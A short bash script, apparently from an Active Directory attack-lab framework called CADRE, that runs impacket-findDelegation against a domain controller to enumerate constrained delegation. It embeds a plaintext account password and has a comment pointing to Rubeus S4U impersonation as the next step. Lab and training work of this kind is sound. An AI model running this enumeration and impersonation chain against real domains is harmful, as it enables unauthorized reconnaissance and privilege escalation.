#!/bin/bash
# CADRE — WT#006 Constrained Delegation (No Protocol Transition)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#006 — Constrained Delegation (No Protocol Transition)"
start_attack "006" "Constrained Delegation (No Protocol Transition)"

require_tool impacket-findDelegation
require_env DC03 "DC03"
require_env DOMAIN_EXT "DOMAIN_EXT"

step "Step 1: Enumerate constrained delegation (no protocol transition)"
run_cmd "impacket-findDelegation \"$DOMAIN_EXT/analyst_osint:'0S1NT_An@lyst!'\" -dc-ip $DC03"

# NOTE: Without protocol transition, S4U2Self requires an interactive TGT.
# On Windows: use Rubeus s4u /ticket:<base64-ticket> /impersonateuser.

result $? "Constrained delegation (no protocol transition) enumeration completed"
